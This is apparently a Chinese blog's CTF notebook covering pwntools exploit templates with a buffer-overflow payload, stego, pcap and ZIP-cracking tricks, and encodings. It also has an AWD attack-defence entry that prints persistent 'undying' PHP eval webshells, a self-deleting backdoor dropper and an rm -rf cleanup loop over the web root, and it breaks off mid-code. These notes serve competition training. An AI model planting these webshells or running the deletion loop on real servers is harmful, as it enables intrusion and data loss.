href="#转码" class="headerlink" title="转码"></a>转码</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-apache codeBlockLines"><span class="line"><span class="hljs-attribute">p32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">01020304</span>) # &#x27;\x<span class="hljs-number">04</span>\x<span class="hljs-number">03</span>\x<span class="hljs-number">02</span>\x<span class="hljs-number">01</span>&#x27;</span><span class="line"><span class="hljs-comment"># 小端序格式转化4个字节</span></span><span class="line"><span class="hljs-attribute">p64</span>()</span><span class="line"><span class="hljs-attribute">p16</span>()</span></code></pre></div></div><h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-angelscript codeBlockLines"><span class="line">c.<span class="hljs-built_in">int</span>eractive()</span></code></pre></div></div><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-livecodeserver codeBlockLines"><span class="line">p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./prc&#x27;</span>) <span class="hljs-comment"># 运行设置要运行的程序</span></span><span class="line">context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span> <span class="hljs-comment"># 显示所有输入输出信息</span></span><span class="line">context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># 设置运行的terminal， 还可以安装tmux</span></span><span class="line">gdb.attach(p)</span></code></pre></div></div><h3 id="基本模板"><a href="#基本模板" class="headerlink" title="基本模板"></a>基本模板</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><span class="line">context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <span class="hljs-comment">#debug模式,可输出详细信息</span></span><span class="line">conn = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span> , <span class="hljs-number">12345</span>) <span class="hljs-comment">#通过socat将二进制文件运行在某个端口之后,可使用本语句建立连接,易于在本地与远程之间转换。</span></span><span class="line"><span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(pwnlib.util.proc.pidof(<span class="hljs-string">&#x27;&lt;file_name&gt;&#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-comment">#这两条便于在gdb下迅速attach 上对应的pid</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment">## context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><span class="line">gdb.attach(proc.pidof(<span class="hljs-string">&#x27;&lt;file_name&gt;&#x27;</span>)[<span class="hljs-number">0</span>])</span><span class="line"></br></span><span class="line">raw_input(<span class="hljs-string">&#x27;continue&#x27;</span>)</span><span class="line">conn.recvuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>) <span class="hljs-comment">#两种不同的recv</span></span><span class="line">conn.recv(<span class="hljs-number">2048</span>)</span><span class="line">shellcode = p32(<span class="hljs-number">0x0804a028</span>) <span class="hljs-comment">#用于将数字变成\x28\xa0\x04\x08的形式</span></span><span class="line">conn.sendline(shellcode) <span class="hljs-comment">#向程序发送信息,使用sendline而非send是个好习惯</span></span><span class="line">conn.interactive() <span class="hljs-comment">#拿到shell之后,用此进行交互</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><span class="line">pwn=remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;12345&quot;</span>)</span><span class="line">payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(<span class="hljs-number">0x00000000004005bd</span>)</span><span class="line"><span class="hljs-comment">##pwn.recvuntil(&#x27;Welcome&#x27;) #两种不同的recv</span></span><span class="line">pwn.sendline(payload)</span><span class="line">pwn.interactive()</span></code></pre></div></div><p>本地调试</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-dts codeBlockLines"><span class="line">socat tcp-listen:<span class="hljs-number">12345</span>,fork EXEC:./<span class="hljs-params">&lt;file_name&gt;</span></span><span class="line"></br></span><span class="line">gdb -&gt; attach <span class="hljs-params">&lt;pid&gt;</span> <span class="hljs-meta"># 通过附加来得到准确的调试</span></span></code></pre></div></div><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h3><h4 id="图片的隐写术"><a href="#图片的隐写术" class="headerlink" title="图片的隐写术"></a>图片的隐写术</h4><p>一般使用<code>Stegsolve</code>这个工具。</p><p>这个工具包含：</p><ul><li>可以键盘左右来测试不同的色彩通道</li><li>和其他图片进行xor，sub等操作</li><li>对<code>gif</code>格式的动图可以一帧一帧的看</li></ul><h5 id="LSB-最低有效位-Least-Significant-Bit"><a href="#LSB-最低有效位-Least-Significant-Bit" class="headerlink" title="LSB 最低有效位 (Least Significant Bit)"></a>LSB 最低有效位 (Least Significant Bit)</h5><p>这个的原理是利用RGB后两位的差别人眼看不出来的利用。将信息写在RGB的后2bit。</p><p>（而要使用这样的隐写术，<code>jpg</code>格式就不行，因为<code>jpg</code>格式的会有损压缩。）</p><p>解题用到<code>Stegsolve</code>这个工具。</p><p><a href="https://segmentfault.com/a/1190000016223897">这里</a>是参考文章</p><h5 id="图片的叠加"><a href="#图片的叠加" class="headerlink" title="图片的叠加"></a>图片的叠加</h5><p>通常首先检查这个图片是否有其他文件叠加起来，为什么可以叠加，原因在于PNG的结束符为<code>FF D9</code>。结束符后面的内容不做显示。</p><p>查看并且提取文件的方法：</p><ul><li><code>binwalk -e &lt;file&gt;</code> -e 是提取文件。</li><li><code>foremost &lt;file&gt;</code>  提取文件</li><li><code>dd if=要分离的图片名.jpg of=分离出来的图片名.jpg skip=偏移量 bs=1</code> 手动分离</li></ul><h4 id="音频的隐写术"><a href="#音频的隐写术" class="headerlink" title="音频的隐写术"></a>音频的隐写术</h4><ul><li><a href="https://blog.csdn.net/pdsu161530247/article/details/77568807">参考</a>这篇总结</li></ul><p>一般使用<code>Audacity</code>工具</p><h5 id="莫斯密码"><a href="#莫斯密码" class="headerlink" title="莫斯密码"></a>莫斯密码</h5><p>有敲打声， 放大波形图</p><h5 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h5><p>有的会通过在频谱中写入flag的方式来隐藏</p><p>解密的方法是在Audacity点击<code>轨道名称 -&gt; 频谱图</code></p><h4 id="网络包的隐写术"><a href="#网络包的隐写术" class="headerlink" title="网络包的隐写术"></a>网络包的隐写术</h4><h5 id="隐藏在tcp流中的文件提取方法"><a href="#隐藏在tcp流中的文件提取方法" class="headerlink" title="隐藏在tcp流中的文件提取方法"></a>隐藏在tcp流中的文件提取方法</h5><ol><li>通过<code>文件 -&gt; 导出对象 -&gt; HTTP</code>选择需要导出的文件</li></ol><p>或者</p><ul><li>找到tcp流，然后保存为<code>C Array</code>格式的文件，简单的修改数组为<code>python</code>格式的数组后，写段脚本保存到二进制文件</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:</span><span class="line">a = <span class="hljs-built_in">bytearray</span>(array_code)</span><span class="line">file.write(a)</span></code></pre></div></div><ol start="2"><li>使用<code>foremost</code>工具</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-applescript codeBlockLines"><span class="line">foremost -v -i <span class="hljs-built_in">file</span>.pcap</span></code></pre></div></div><h5 id="通过报文的长度传递信息"><a href="#通过报文的长度传递信息" class="headerlink" title="通过报文的长度传递信息"></a>通过报文的长度传递信息</h5><p>常见的是<code>ping</code>可以随意的控制报文的长度，通过时间顺序排列出<code>ping</code>报文，然后得出长度，但是这个长度一般是有偏移的，所以写一个遍历<code>range(-50, 50)</code>这样的偏离就可以找到<code>flag</code>了</p><h5 id="cap文件载入出错"><a href="#cap文件载入出错" class="headerlink" title="cap文件载入出错"></a>cap文件载入出错</h5><p>有时候会有<code>cap</code>文件载入出错，此时需要修复为<code>pcap</code>文件， 在<a href="http://f00l.de/hacking/pcapfix.php">这个</a>网站修复</p><h5 id="将flag放在IP头部中"><a href="#将flag放在IP头部中" class="headerlink" title="将flag放在IP头部中"></a>将flag放在IP头部中</h5><p>一般会有一序列能让你找到的<code>flag</code>字符串，找到后这些TCP中的IP头部中可能就会隐藏着真正的<code>flag</code></p><p>要如何找，flag会被拆分放到各个TCP中，而且可能是颠倒的，所以还是要考眼力，多种情况的flag样式要敏感</p><h5 id="SSL加密报文"><a href="#SSL加密报文" class="headerlink" title="SSL加密报文"></a>SSL加密报文</h5><p>想要解密SSL的加密报文，需要有<code>key.log</code>，这个key的格式如下：</p><p><code>CLIENT_RANDOM a3cd2cd8add1529ff7c65dc2fdc99504ca00b38f79bad693372ddc1d23cf6e50 4cc397a91832195287d8614db7e5c9175395a7063eefed8d3b2b06c04a8213345fcdd233e4b82a8695dd17c32bfaeeb9</code></p><p><a href="http://scz.617.cn/network/201512241045.txt">这里</a>是如何使用wireshark解密SSL的文章。</p><p>简单来讲是找到<code>key.log</code>后<br><code>Wireshark-&gt;Edit-&gt;Preferences-&gt;Protocols-&gt;SSL-&gt;(Pre)-Master-Secret log filename-&gt;&lt;path&gt;\sslkey.log</code></p><hr><h3 id="文件头部破坏"><a href="#文件头部破坏" class="headerlink" title="文件头部破坏"></a>文件头部破坏</h3><ul><li><a href="https://app.yinxiang.com/Home.action#n=2682fd10-8a40-4331-bd62-4502765a8f0a&s=s3&ses=4&sh=2&sds=5&">这里</a>是各种头部的特征码</li></ul><h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>GIF字段+版本号，通常是：</p><p><code>GIF89a</code> 或者<code>GIF87a</code></p><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>通常是<br><code>89 50 4E 47  0D 0A 1A 0A   00 00 00 00  49 48 44 52  .PNG........IHDR</code></p><h3 id="文本转到二进制文件"><a href="#文本转到二进制文件" class="headerlink" title="文本转到二进制文件"></a>文本转到二进制文件</h3><ul><li>当给出的是 <code>00000000: 4c5a 4950 01b3 007f b61b edf0 8440 58e3  LZIP.........@X.</code>这样的文件时，可以通过<code>xxd</code>直接转换成二进制文件</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">file</span>.txt | xxd -r &gt; <span class="hljs-keyword">file</span>.bin</span></code></pre></div></div><ul><li>当给出的是<code>4c5a 4950 01b3 007f b61b edf0 8440 58e3</code>这样的，或者是wireshark给的<code>C Array</code>类型的数组格式</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./file.txt&#x27;</span>)</span><span class="line"></br></span><span class="line">tmp = []</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line.strip().split(<span class="hljs-string">&#x27; &#x27;</span>):</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">4</span>:</span><span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i[:<span class="hljs-number">2</span>], <span class="hljs-number">16</span>))</span><span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>))</span><span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">2</span>:</span><span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>))</span><span class="line"></br></span><span class="line">out = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./file.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)</span><span class="line">out.write(<span class="hljs-built_in">bytearray</span>(tmp)) <span class="hljs-comment"># bytearray()是关键方法</span></span></code></pre></div></div><h3 id="关于-ZIP-的题目"><a href="#关于-ZIP-的题目" class="headerlink" title="关于 ZIP 的题目"></a>关于 ZIP 的题目</h3><ul><li><a href="https://introspelliam.github.io/2017/11/12/misc/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%85%B3%E4%BA%8Ezip%E7%9A%84%E6%80%BB%E7%BB%93/">这里</a>是关于ZIP破解的总结</li></ul><h4 id="爆破软件"><a href="#爆破软件" class="headerlink" title="爆破软件"></a>爆破软件</h4><p><code>ZipPasswordTool.exe</code></p><p><code>HAP_Advanced Archive Password Recovery 4.53.exe</code></p><h4 id="伪密码"><a href="#伪密码" class="headerlink" title="伪密码"></a>伪密码</h4><p>方法是定位到<code>50 4B 01 02</code>，然后向后找到<code>09 00</code> 修改为<code>00 00</code><br>如果是伪加密，那么就可以直接解压了。<code>unzip</code></p><p>在<code>010Editor</code>中可以看到，伪密码所在的地方是<code>ZIPDIRENTRY -&gt; deFlags</code><br>奇数加密，偶数不加密。</p><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>多线程使用  <code>ZipPasswordTool.exe</code></p><p>当需要用到掩码的时候，使用<code>AdvancedArchivePasswordRecovery.exe</code></p><h4 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h4><p>当能够取得加密文件中其中一个文件时，可以使用明文攻击。<br>原理是通过计算<code>crc</code>的值而直接得到加密秘钥。</p><h3 id="LZIP-文件"><a href="#LZIP-文件" class="headerlink" title="LZIP 文件"></a>LZIP 文件</h3><p><code>lzip</code>文件是单文件压缩，通过工具<code>lzip -d</code>解压</p><h3 id="python-反编译"><a href="#python-反编译" class="headerlink" title="python 反编译"></a>python 反编译</h3><ul><li>使用<code>uncompyle2</code>反编译</li></ul><p><a href="%60https://github.com/wibiti/uncompyle2.git%60">Github项目地址</a></p><ul><li>使用<a href="http://tools.bugscaner.com/decompyle/">这个</a>网站反编译</li></ul><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="在线工具集"><a href="#在线工具集" class="headerlink" title="在线工具集"></a>在线工具集</h3><ul><li><a href="http://ctf.ssleye.com/">CTF 在线工具</a><ul><li>rot13 不区分大小写，有问题</li></ul></li><li><a href="https://tool.bugku.com/?wafcloud=1">CTF在线工具2</a></li><li><a href="https://blog.csdn.net/qq_38780085/article/details/79305488">整合的工具网站</a></li><li><a href="http://tool.chinaz.com/tools/base64.aspx">站长工具</a></li><li><a href="https://www.bugku.com/mima/">社工字典在线生成</a><ul><li><a href="https://www.freebuf.com/sectool/144740.html">这是</a><code>cupp</code>字典生成 和<code>cewl</code>网站关键字收集的工具介绍</li><li><a href="https://github.com/Saferman/cupper">这是</a>中文社工字典生成器，<code>/root/lib/gitbug_object/cupper</code></li></ul></li></ul><hr><ul><li><a href="https://www.cmd5.com/">md5</a></li><li><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码</a></li><li><a href="http://www.mxcz.net/tools/rot13.aspx">rot13</a></li><li><a href="http://www.ofmonkey.com/encode/unicode">unicode</a></li><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">摩斯密码</a></li><li><a href="http://ctf.ssleye.com/base64.html">Base</a></li><li><a href="http://web.chacuo.net/charsetxxencode">xxencode</a></li><li><a href="http://www.nicetool.net/app/binary_convert.html">二进制</a></li><li><a href="https://www.bugku.com/tools/jsfuck/">JsFuck</a></li><li><a href="https://www.toolnb.com/tools/phpserialize.html">php序列化与反序列化</a></li></ul><hr><ul><li><a href="http://byd.dropsec.xyz/2016/05/25/CTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93/">这里</a>介绍了CTF常用的加密技术</li><li><a href="https://app.yinxiang.com/shard/s3/nl/1049412/2d6c5e63-14ef-49d9-bb17-00b41e76756d?title=CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86">这里</a>是一份<strong>完整的</strong>密码学汇总</li><li><a href="https://blog.csdn.net/qq_40836553/article/details/79383488">这里</a>也是总结，有表</li></ul><h3 id="Quoted-printable编码"><a href="#Quoted-printable编码" class="headerlink" title="Quoted-printable编码"></a>Quoted-printable编码</h3><p>可打印编码<br><em>特点</em> 是有3个为一组，每组开头都是<code>=</code></p><p>e.g: <code>=B9=A4=D7=F7=BC=F2=B1=A8</code></p><p>用处是可以用在非8bit的传输通道上</p><h3 id="XXencode"><a href="#XXencode" class="headerlink" title="XXencode"></a>XXencode</h3><p><em>特点</em> 是末尾有<code>+</code>或者<code>-</code></p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p><em>特点</em> 是<code>数字+字母</code>，并且要么是32位，要么是64位</p><h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><p><em>特点</em> 8bit一组的<code>0</code> <code>1</code></p><h3 id="JsFuck"><a href="#JsFuck" class="headerlink" title="JsFuck"></a>JsFuck</h3><p><em>特点</em> 全是<code>[</code> <code>]</code> <code>!</code></p><h3 id="bubblepy"><a href="#bubblepy" class="headerlink" title="bubblepy"></a>bubblepy</h3><p><em>特点</em> 已字母5个为一组，用<code>-</code>连接</p><p>如：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx</span></span></code></pre></div></div><p>解密方法是使用python的库</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">pip install bubblepy</span><span class="line"></br></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> bubblepy <span class="hljs-keyword">import</span> BubbleBabble</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx&#x27;</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>BubbleBabble().decode(<span class="hljs-built_in">str</span>)</span><span class="line"><span class="hljs-string">&#x27;flag&#123;Ev3ry7hing_i5_bubb13s&#125;&#x27;</span></span></code></pre></div></div><h3 id="PDF417"><a href="#PDF417" class="headerlink" title="PDF417"></a>PDF417</h3><p>二维条形码，比普通条形码能记录更多的东西，并且不需要数据库。</p><p><a href="https://online-barcode-reader.inliteresearch.com/">在线条码读取器</a>，翻墙。比手机要准确，支持多种格式。</p><h3 id="差分曼彻斯特编码"><a href="#差分曼彻斯特编码" class="headerlink" title="差分曼彻斯特编码"></a>差分曼彻斯特编码</h3><p>常用于局域网的传输</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红蓝对抗常规操作</title>
      <link href="/2021/12/31/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/12/31/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="开局思路"><a href="#开局思路" class="headerlink" title="开局思路"></a>开局思路</h2><ol><li>修改密码</li><li>关闭端口</li><li>确保不要让机器下线</li><li>将网站的源码备份，并将源码放入虚拟机进行代码审计和木马查杀，用<code>#</code>注释掉</li><li>搜索高危函数，并将当前高危函数修复为正常没有漏洞的函数，或者用PHP写一个简单的WAF，用<code>include</code>包含上去</li><li>快速扫描别人的webshell</li><li>实时监控当前web访问日志，及时审查。</li><li>发现别人进入后迅速修复漏洞</li><li>如果进入别人的目录，那么就循环生成webshell。</li><li>抓到其他人的语句，那么就学习并打回去</li><li>使用<code>tcpdump</code>监控流量</li><li><code>SEAY</code>代码审计工具， <code>D盾</code>部署在本地服务器上快速查杀</li><li>备份网站目录，且不要将网站备份放在ROOT上</li><li>攻击人员2人，防守人员1人</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-meta">&lt;?php</span></span><span class="line"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot; a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><span class="line"><span class="hljs-variable">$a</span>=str_rot13(<span class="hljs-variable">$a</span>);</span><span class="line"><span class="hljs-variable">$a</span>=strrev(<span class="hljs-variable">$a</span>);</span><span class="line"><span class="hljs-variable">$a</span>=base64_decode(<span class="hljs-variable">$a</span>);</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode233</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span></span><span class="line"></br>&#123;</span><span class="line">    <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;&quot;</span>;</span><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$test</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$test</span>&lt;strlen(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$test</span>++)</span><span class="line">    &#123;</span><span class="line">        <span class="hljs-variable">$b</span>=<span class="hljs-variable">$b</span>.(chr(ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$test</span>])-<span class="hljs-number">1</span>));</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$b</span>;</span><span class="line">&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">echo</span> strrev(decode233(<span class="hljs-variable">$a</span>));</span><span class="line"><span class="hljs-meta">?&gt;</span></span></code></pre></div></div><ul><li>以下是不死马<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php-template codeBlockLines"><span class="line"><span class="xml">while true;do echo &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;x&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; &gt; x.php;sleep 1;done</span></span></code></pre></div></div></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-reasonml codeBlockLines"><span class="line">&lt;?php</span><span class="line">set<span class="hljs-constructor">_time_limit(0)</span>;</span><span class="line"><span class="hljs-comment">//程序执行时间</span></span><span class="line">ignore<span class="hljs-constructor">_user_abort(1)</span>;</span><span class="line"><span class="hljs-comment">//关掉终端后脚本仍然运行</span></span><span class="line">unlink(__FILE__);</span><span class="line"><span class="hljs-comment">//文件完整名</span></span><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;</span><span class="line"> file<span class="hljs-constructor">_put_contents(&#x27;.<span class="hljs-params">test</span>.<span class="hljs-params">php</span>&#x27;,&#x27;&lt;?<span class="hljs-params">php</span> $<span class="hljs-params">a</span>=<span class="hljs-params">array</span>($<span class="hljs-params">_REQUEST</span>[<span class="hljs-string">&quot;x&quot;</span>]=&gt;<span class="hljs-string">&quot;3&quot;</span>)</span>;   <span class="hljs-comment">// pwd=x</span></span><span class="line">$b=<span class="hljs-built_in">array</span><span class="hljs-constructor">_keys($<span class="hljs-params">a</span>)</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;</span><span class="line">eval($b);?&gt;&#x27;);</span><span class="line"> sleep(<span class="hljs-number">5</span>);</span><span class="line">&#125;</span><span class="line">?&gt;</span></code></pre></div></div><ul><li>用shell去监控当前目录是否有新增文件</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    find /var/www/html/ -cmin -60 -<span class="hljs-built_in">type</span> f | xargs rm -rf</span><span class="line">    sleep 1</span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><ul><li><a href="https://github.com/admintony/Prepare-for-AWD">AWD流程框架和脚本集合</a></li></ul><p>waf</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-meta">&lt;?php</span></span><span class="line"><span class="hljs-comment">//error_reporting(E_ALL);</span></span><span class="line"><span class="hljs-comment">//ini_set(&#x27;display_errors&#x27;, 1);</span></span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">检测请求方式，除了get和post之外拦截下来并写日志。</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;</span><span class="line">    write_attack_log(<span class="hljs-string">&quot;method&quot;</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//获取uri来进行检测</span></span><span class="line"><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取post的data，无论是否是mutipa</span></span><span class="line">rt <span class="hljs-variable">$headers</span> = get_all_headers(); <span class="hljs-comment">//获取header</span></span><span class="line">filter_attack_keyword(filter_invisible(urldecode(filter_0x25(<span class="hljs-variable">$url</span>)))); <span class="hljs-comment">//</span></span><span class="line">对URL进行检测，出现问题则拦截并记录filter_attack_keyword(filter_invisible(urldecode(filter_0x25(<span class="hljs-variable">$data</span>))));</span><span class="line"><span class="hljs-comment">//对POST的内容进行检测，出现问题拦截并记录</span></span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">检测过了则对输入进行简单过滤</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">    <span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = filter_dangerous_words(<span class="hljs-variable">$value</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">    <span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = filter_dangerous_words(<span class="hljs-variable">$value</span>);</span><span class="line">&#125;</span><span class="line"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">    filter_attack_keyword(filter_invisible(urldecode(filter_0x25(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//对http请求头进行检测，出现问题拦截并记录</span></span><span class="line">    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = filter_dangerous_words(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//简单过滤</span></span><span class="line"></br></span><span class="line">&#125;</span><span class="line"><span class="hljs-comment">/*</span></span><span class="line"><span class="hljs-comment">获取http请求头并写入数组</span></span><span class="line"><span class="hljs-comment">*/</span></span><span class="line"></br>) </span>&#123;</span><span class="line">    <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>();</span><span class="line">    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;</span><span class="line">        <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;</span><span class="line">            <span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;</span><span class="line">        &#125;</span><span class="line">    &#125;</span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;</span><span class="line">&#125;</span><span class="line"><span 